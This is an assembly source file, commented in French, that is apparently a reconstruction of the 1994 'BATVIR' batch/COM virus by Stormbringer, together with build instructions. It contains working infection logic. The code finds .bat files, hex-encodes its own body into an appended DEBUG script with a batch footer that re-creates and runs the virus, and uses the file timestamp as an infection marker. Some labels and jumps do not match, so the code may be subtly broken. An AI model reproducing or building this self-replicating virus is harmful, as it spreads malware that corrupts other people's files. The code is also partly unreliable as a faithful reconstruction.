;============================================================================
; BATVIR '94 - Stormbringer [P/S]  1994
; Virus hybride Batch + COM
;
; Version ASM reconstruite pour TASM 4
;   tasm Vir94_BATVIR_Stormbringer.asm
;   tlink /t Vir94_BATVIR_Stormbringer.obj
;
; Le but est d'obtenir un .COM qui reproduit le comportement original.
;============================================================================

.model tiny
.code
org     100h

;============================= CODE PRINCIPAL ==============================
start:
        mov     ah, 4Eh                 ; AH=4E FindFirst
        mov     dx, offset bat_mask
        int     21h
        jb      virus_exit

main_loop:
        mov     dx, 9Eh                 ; DTA - nom du fichier trouvé
        mov     ax, 3D02h               ; Open for read/write
        int     21h
        jb      find_next

        xchg    bx, ax                  ; BX = handle

        mov     ax, 5700h               ; Get file date/time
        int     21h
        push    cx
        push    dx

        cmp     dh, 80h                 ; Marqueur d'infection (date haute)
        jae     restore_and_close

        ; Aller à la fin du fichier
        mov     ax, 4202h
        xor     cx, cx
        xor     dx, dx
        int     21h

        ; Encoder notre propre corps (depuis 100h) en format hex DEBUG
        mov     si, 100h
        mov     di, 2CAh                ; buffer pour les lignes hex
        mov     cx, 1CAh
        push    bx
        call    sub_53          ; IDA: sub_53 - hex encoder
        pop     bx

        call    sub_80          ; IDA: sub_80 - write debug script

restore_and_close:
        pop     dx
        pop     cx
        mov     ax, 5701h               ; Restore date/time (avec marqueur)
        int     21h

        mov     ah, 3Eh
        int     21h

find_next:
        mov     ah, 4Fh
        jmp     main_loop

virus_exit:
        mov     ax, 4C00h
        int     21h

; ======================== SOUS-ROUTINES ===================================

; Convertit CX octets depuis SI vers DI en format "XX " (hex ASCII)
hex_encode proc
        push    cx
hex_loop:
        lodsb
        mov     bx, ax
        mov     cx, 4
        shr     al, cl
        push    ax
        call    nibble_to_hex
        stosb
        pop     ax
        shl     al, cl
        sub     bl, al
        xchg    bl, al
        call    nibble_to_hex
        stosb
        mov     al, ' '
        stosb
        pop     cx
        loop    hex_loop
        stosb
        stosb
        ret
hex_encode endp

; sub_76 (IDA label) - nibble to ASCII hex char
sub_76:
nibble_to_hex proc
        cmp     al, 0Ah
        jae     @letter
        add     al, '0'
        ret
@letter:
        add     al, '7'
        ret
nibble_to_hex endp

; Écrit le script DEBUG + commandes batch dans le fichier cible
append_debug_payload proc
        ; Écrit en-tête DEBUG (40h octets à l'offset 280h dans le layout original)
        mov     ah, 40h
        mov     dx, offset debug_script_header
        mov     cx, 40h
        int     21h

        ; Écrit les données hex
        mov     dx, 2CAh
        push    dx
        call    write_e_line            ; "e0100  "
        call    write_crlf
        pop     dx
        push    dx

        mov     cx, di
        sub     cx, dx
        cmp     cx, 3Ch
        jb      short_write
        mov     cx, 3Ch
short_write:
        mov     ah, 40h
        int     21h

        push    ax
        call    write_crlf
        pop     ax

        pop     dx
        add     dx, ax
        cmp     dx, di
        jae     write_tail
        jmp     append_debug_payload+0Ah   ; boucle sur chunks

write_tail:
        call    write_crlf2
        mov     ah, 40h
        mov     dx, offset g_cmd
        mov     cx, 1
        int     21h
        call    write_crlf
        call    write_crlf2

        mov     ah, 40h
        mov     dx, offset w_cmd
        mov     cx, 1
        int     21h
        call    write_crlf
        call    write_crlf2

        mov     dx, offset bat_footer
        mov     cx, 2Ah
        mov     ah, 40h
        int     21h
        ret
append_debug_payload endp

write_crlf proc
        mov     dx, offset crlf_str
        mov     cx, 2
        mov     ah, 40h
        int     21h
        ret
write_crlf endp

write_crlf2 proc
        mov     cx, 5
        mov     dx, offset crlf_str
        mov     ah, 40h
        int     21h
        ret
write_crlf2 endp

write_e_line proc
        mov     dx, offset e0100_line
        mov     cx, 8
        mov     ah, 40h
        int     21h
        ret
write_e_line endp

; ============================ DATA ========================================

bat_mask        db      '*.bat', 0

; Espace pour que les offsets durs du code original tombent bien
                db      140h dup (0)     ; padding pour atteindre ~280h

; Script DEBUG et commandes batch (les mêmes que dans l'original)
debug_script_header db 0Dh,0Ah,0Dh,0Ah
                    db 60 dup (0)        ; espace comme dans l'original

e0100_line      db      'e0100  '
g_cmd           db      'g',0Dh,0Ah
w_cmd           db      'w',0Dh,0Ah
crlf_str        db      0Dh,0Ah

; Le footer batch qui est exécuté quand on lance le .bat infecté
bat_footer      db      'gqecho e0100  >>batvir.94',0Dh,0Ah
                db      'debug<batvir.94',0Dh,0Ah
                db      'del batvir.94',0Dh,0Ah
                db      'ctty con',0Dh,0Ah,0Dh,0Ah

; NOTE : Dans le fichier .BAT complet distribué, on trouve aussi :
;   @echo off
;   ctty nul
;   rem [BATVIR] '94 (c) Stormbringer [P/S]
;
; Pour recréer le fichier original complet, compilez ce .asm en .com
; puis concaténez la partie batch au début ou à la fin selon la méthode
; de l'époque.

end start
